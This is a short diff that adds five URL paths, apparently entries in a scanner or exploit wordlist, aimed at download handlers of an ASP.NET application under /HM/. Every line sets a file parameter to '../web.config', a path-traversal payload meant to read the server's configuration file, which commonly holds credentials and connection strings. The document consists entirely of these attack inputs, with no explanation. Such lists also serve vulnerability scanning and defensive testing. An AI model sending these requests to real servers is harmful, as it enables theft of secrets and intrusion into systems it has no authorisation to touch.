@@ -1,0 +1,5 @@
+/HM/M_Main/InformationManage/ContractDownLoad.aspx?ContractFile=../web.config
+/HM/M_main/InformationManage/OwnerVacantDownLoad.aspx?OwnerVacantFile=../web.config
+/HM/M_main/InformationManage/VacantDiscountDownLoad.aspx?VacantDiscountFile=../web.config
+/HM/M_Main/InformationManage/PlanDownLoad.aspx?PlanFile=../web.config
+/HM/M_Main/InformationManage/ParkingFeelFileDownLoad.aspx?ParkingFile=../web.config
